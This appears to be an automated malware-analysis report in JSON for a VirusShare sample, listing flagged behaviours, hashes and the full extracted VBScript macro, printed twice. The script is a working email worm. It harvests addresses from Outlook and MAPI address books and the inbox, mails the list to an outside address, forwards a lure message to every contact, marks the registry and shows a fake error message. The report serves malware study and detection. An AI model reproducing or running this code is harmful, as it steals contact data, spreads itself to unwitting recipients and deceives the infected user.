{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "CreateObject": "May create an OLE object",
            "RegRead": "May read registry keys",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "chr": "May attempt to obfuscate specific str"
        },
        "macro": "rem By Dal Pachinski\nrem Dedicated to the Hacker WebRing\nrem Rule!\n\nDim AllAddresses(32767)\nDim Names(32767)\nDim AddrCount\nDim MAPI\nDim ForwardThis\ndim AlreadySent\n\nSub Start()\n    Set MAPI = CreateObject(\"MAPI.Session\")\n    MAPI.Logon \"\",\"\",false,false\n    AddrCount = 0\n    AlreadySent = false\nEnd Sub\n\nSub Finish()\n    MAPI.Logoff\nEnd Sub\n\nfunction AnAt(byval Addr)\n  AnAt = false\n  for cntr = 1 to len(Addr)\n    if mid(Addr,cntr,1) = \"@\" then\n      AnAt = true\n      cntr = 32767\n    end if\n  next\nend function\n\nfunction dupl(byval OneAd)\n  dupl = false\n  for cntrx = 1 to AddrCount\n    if AllAddresses(cntrx - 1) = OneAd then \n      cntrx = AddrCount + 1\n      dupl = true\n    end if\n  next\nend function\n\nSub GetMAPIAddressBook()\n    err.number = 0\n    for cntrlists = 1 to MAPI.AddressLists.Count\n\tset AddrList = MAPI.AddressLists(cntrlists).AddressEntries\n      CountTo = AddrList.Count\n      if CountTo > 32767 then CountTo = 32767\n      for cntrentry = 1 to CountTo\n\tset AEntry = AddrList(cntrentry)\n\tdummy = AEntry.Name\n\tif err.number <> 0 then\n\t  cntrentry = 32768\n\telse\n\t  if (trim(AEntry.Address) <> \"\" or trim(AEntry.Name) <> \"\") and not dupl(AEntry.Address) then\n\t    AllAddresses(AddrCount) = AEntry.Address\n\t    Names(AddrCount) = AEntry.Name\n\t    AddrCount = AddrCount + 1\n\t  end if\n\tend if\n      next\n    next\nEnd Sub\n\nsub GetAddressBook()\n    on error resume next\n    err.number = 0\n    set outlook = createobject(\"Outlook.Application\")\n    set outmapi = outlook.getnamespace(\"MAPI\")\n\n    for cntrlists = 1 to outmapi.AddressLists.Count\n\tset AddrList = outmapi.AddressLists(cntrlists).AddressEntries\n      CountTo = AddrList.Count\n      if CountTo > 32767 then CountTo = 32767\n      for cntrentry = 1 to CountTo\n\tset AEntry = AddrList(cntrentry)\n\tdummy = AEntry.Name\n\tif err.number <> 0 then\n\t  cntrentry = 32768\n\telse\n\t  if (trim(AEntry.Address) <> \"\" or trim(AEntry.Name) <> \"\") and not dupl(AEntry.Address) then\n\t    AllAddresses(AddrCount) = AEntry.Address\n\t    Names(AddrCount) = AEntry.Name\n\t    AddrCount = AddrCount + 1\n\t  end if\n\tend if\n      next\n    next\n\nend sub\n\nSub GetInBox()\n    err.number = 0\n    Set Inbox = MAPI.Inbox.Messages\n    cntr = 1\n    while cntr < 32766\n      if cntr = 1 then\n        set Msg = Inbox.GetFirst()\n      else\n        set Msg = Inbox.GetNext()\n      end if\n\n      dummy = msg.subject\n      if err.number <= 0 then\n        if Msg.Subject = \"Thanks for that...\" then set ForwardThis = Msg\n        for cntr2 = 1 to Msg.Recipients.Count\n          set OneRecip = msg.recipients.item(clng(cntr2))\n          if (trim(OneRecip.Address) <> \"\" or trim(OneRecip.Name) <> \"\") and not dupl(OneRecip.Address) then\n\t      AllAddresses(AddrCount) = OneRecip.Address\n            Names(AddrCount) = OneRecip.Name\n            AddrCount = AddrCount + 1\n          end if\n        next\n        cntr = cntr + 1\n      else\n        cntr = 32767\n      end if\n    wend\nEnd Sub\n\nSub Transmit()\n    set outlook = createobject(\"Outlook.Application\")\n    set outmapi = outlook.getnamespace(\"MAPI\")\n\n    set Msg = outlook.createitem(0)\n    for cntr = 1 to AddrCount\n      if AnAt(AllAddresses(cntr - 1)) then Msg.body = Msg.body + AllAddresses(cntr - 1) + chr(13) + chr(10)\n    next\n    Msg.Recipients.Add \"SarahMichelle@freewebaccess.co.uk\"\n    msg.subject = \"Draft 2\"\n    Msg.Send\n    AlreadySent = true\nEnd Sub\n\nSub MAPITransmit()\n    set Msg = MAPI.Outbox.Messages.Add\n    for cntr = 1 to AddrCount\n      if AnAt(AllAddresses(cntr - 1)) then Msg.Text = Msg.Text + AllAddresses(cntr - 1) + chr(13) + chr(10)\n    next\n    Msg.Recipients.Add \"SarahMichelle@freewebaccess.co.uk\"\n    Msg.Subject = \"Draft 2\"\n    Msg.Recipients.Resolve false\n    Msg.Send false,false\nEnd Sub\n\n\nSub Forward()\n    ForwardThis.Recipients.Delete\n    for cntr = 1 to AddrCount\n      set MyRecip = ForwardThis.Recipients.Add\n      if AnAt(AllAddresses(cntr - 1)) then\n\tMyRecip.Name = AllAddresses(cntr - 1)\n      else\n\tMyRecip.Name = Names(cntr - 1)\n      end if\n      MyRecip.Type = 3\n      MyRecip.Resolve\n    next\n    ForwardThis.Send false,false\nEnd Sub\n\non error resume next\nset WS = CreateObject(\"WScript.Shell\")\nresult = WS.RegRead(\"HKEY_LOCAL_MACHINE\\Software\\Sarah.Michelle\\\")\nif result <> \"Complete\" then\n  Call Start\n  Call GetMAPIAddressBook\n  Call GetAddressBook\n  Call GetInBox\n  Call Transmit\n  if AlreadySent = false then Call MAPITransmit\n  Call Forward\n  Call Finish\n  WS.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Sarah.Michelle\\\",\"Complete\"\nend if\n\nmsgbox \"Unable to process file - Internal error at 0x80F3:429A\",,\"Error\""
    },
    "filename": "VirusShare_3d0ac91a4069ab732176731bd476af83",
    "filesize": 4717,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "3d0ac91a4069ab732176731bd476af83",
        "sha1": "be568bd0671fac89e4515649ca6273cdfc16a1c7",
        "sha256": "3f1de85bc93a1658a5f6f67a6816b87c05cd06e34bde5e08379f82c4bcff9553"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "rem By Dal Pachinski",
            "rem Dedicated to the Hacker WebRing",
            "rem Rule!",
            "Dim AllAddresses(32767)",
            "Dim Names(32767)",
            "Dim AddrCount",
            "Dim MAPI",
            "Dim ForwardThis",
            "dim AlreadySent",
            "Sub Start()",
            "    Set MAPI = CreateObject(\"MAPI.Session\")",
            "    MAPI.Logon \"\",\"\",false,false",
            "    AddrCount = 0",
            "    AlreadySent = false",
            "End Sub",
            "Sub Finish()",
            "    MAPI.Logoff",
            "End Sub",
            "function AnAt(byval Addr)",
            "  AnAt = false",
            "  for cntr = 1 to len(Addr)",
            "    if mid(Addr,cntr,1) = \"@\" then",
            "      AnAt = true",
            "      cntr = 32767",
            "    end if",
            "  next",
            "end function",
            "function dupl(byval OneAd)",
            "  dupl = false",
            "  for cntrx = 1 to AddrCount",
            "    if AllAddresses(cntrx - 1) = OneAd then ",
            "      cntrx = AddrCount + 1",
            "      dupl = true",
            "    end if",
            "  next",
            "end function",
            "Sub GetMAPIAddressBook()",
            "    err.number = 0",
            "    for cntrlists = 1 to MAPI.AddressLists.Count",
            "\tset AddrList = MAPI.AddressLists(cntrlists).AddressEntries",
            "      CountTo = AddrList.Count",
            "      if CountTo > 32767 then CountTo = 32767",
            "      for cntrentry = 1 to CountTo",
            "\tset AEntry = AddrList(cntrentry)",
            "\tdummy = AEntry.Name",
            "\tif err.number <> 0 then",
            "\t  cntrentry = 32768",
            "\telse",
            "\t  if (trim(AEntry.Address) <> \"\" or trim(AEntry.Name) <> \"\") and not dupl(AEntry.Address) then",
            "\t    AllAddresses(AddrCount) = AEntry.Address",
            "\t    Names(AddrCount) = AEntry.Name",
            "\t    AddrCount = AddrCount + 1",
            "\t  end if",
            "\tend if",
            "      next",
            "    next",
            "End Sub",
            "sub GetAddressBook()",
            "    on error resume next",
            "    err.number = 0",
            "    set outlook = createobject(\"Outlook.Application\")",
            "    set outmapi = outlook.getnamespace(\"MAPI\")",
            "    for cntrlists = 1 to outmapi.AddressLists.Count",
            "\tset AddrList = outmapi.AddressLists(cntrlists).AddressEntries",
            "      CountTo = AddrList.Count",
            "      if CountTo > 32767 then CountTo = 32767",
            "      for cntrentry = 1 to CountTo",
            "\tset AEntry = AddrList(cntrentry)",
            "\tdummy = AEntry.Name",
            "\tif err.number <> 0 then",
            "\t  cntrentry = 32768",
            "\telse",
            "\t  if (trim(AEntry.Address) <> \"\" or trim(AEntry.Name) <> \"\") and not dupl(AEntry.Address) then",
            "\t    AllAddresses(AddrCount) = AEntry.Address",
            "\t    Names(AddrCount) = AEntry.Name",
            "\t    AddrCount = AddrCount + 1",
            "\t  end if",
            "\tend if",
            "      next",
            "    next",
            "end sub",
            "Sub GetInBox()",
            "    err.number = 0",
            "    Set Inbox = MAPI.Inbox.Messages",
            "    cntr = 1",
            "    while cntr < 32766",
            "      if cntr = 1 then",
            "        set Msg = Inbox.GetFirst()",
            "      else",
            "        set Msg = Inbox.GetNext()",
            "      end if",
            "      dummy = msg.subject",
            "      if err.number <= 0 then",
            "        if Msg.Subject = \"Thanks for that...\" then set ForwardThis = Msg",
            "        for cntr2 = 1 to Msg.Recipients.Count",
            "          set OneRecip = msg.recipients.item(clng(cntr2))",
            "          if (trim(OneRecip.Address) <> \"\" or trim(OneRecip.Name) <> \"\") and not dupl(OneRecip.Address) then",
            "\t      AllAddresses(AddrCount) = OneRecip.Address",
            "            Names(AddrCount) = OneRecip.Name",
            "            AddrCount = AddrCount + 1",
            "          end if",
            "        next",
            "        cntr = cntr + 1",
            "      else",
            "        cntr = 32767",
            "      end if",
            "    wend",
            "End Sub",
            "Sub Transmit()",
            "    set outlook = createobject(\"Outlook.Application\")",
            "    set outmapi = outlook.getnamespace(\"MAPI\")",
            "    set Msg = outlook.createitem(0)",
            "    for cntr = 1 to AddrCount",
            "      if AnAt(AllAddresses(cntr - 1)) then Msg.body = Msg.body + AllAddresses(cntr - 1) + chr(13) + chr(10)",
            "    next",
            "    Msg.Recipients.Add \"SarahMichelle@freewebaccess.co.uk\"",
            "    msg.subject = \"Draft 2\"",
            "    Msg.Send",
            "    AlreadySent = true",
            "End Sub",
            "Sub MAPITransmit()",
            "    set Msg = MAPI.Outbox.Messages.Add",
            "    for cntr = 1 to AddrCount",
            "      if AnAt(AllAddresses(cntr - 1)) then Msg.Text = Msg.Text + AllAddresses(cntr - 1) + chr(13) + chr(10)",
            "    next",
            "    Msg.Recipients.Add \"SarahMichelle@freewebaccess.co.uk\"",
            "    Msg.Subject = \"Draft 2\"",
            "    Msg.Recipients.Resolve false",
            "    Msg.Send false,false",
            "End Sub",
            "Sub Forward()",
            "    ForwardThis.Recipients.Delete",
            "    for cntr = 1 to AddrCount",
            "      set MyRecip = ForwardThis.Recipients.Add",
            "      if AnAt(AllAddresses(cntr - 1)) then",
            "\tMyRecip.Name = AllAddresses(cntr - 1)",
            "      else",
            "\tMyRecip.Name = Names(cntr - 1)",
            "      end if",
            "      MyRecip.Type = 3",
            "      MyRecip.Resolve",
            "    next",
            "    ForwardThis.Send false,false",
            "End Sub",
            "on error resume next",
            "set WS = CreateObject(\"WScript.Shell\")",
            "result = WS.RegRead(\"HKEY_LOCAL_MACHINE\\Software\\Sarah.Michelle\\\")",
            "if result <> \"Complete\" then",
            "  Call Start",
            "  Call GetMAPIAddressBook",
            "  Call GetAddressBook",
            "  Call GetInBox",
            "  Call Transmit",
            "  if AlreadySent = false then Call MAPITransmit",
            "  Call Forward",
            "  Call Finish",
            "  WS.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Sarah.Michelle\\\",\"Complete\"",
            "end if",
            "msgbox \"Unable to process file - Internal error at 0x80F3:429A\",,\"Error\""
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.298825",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
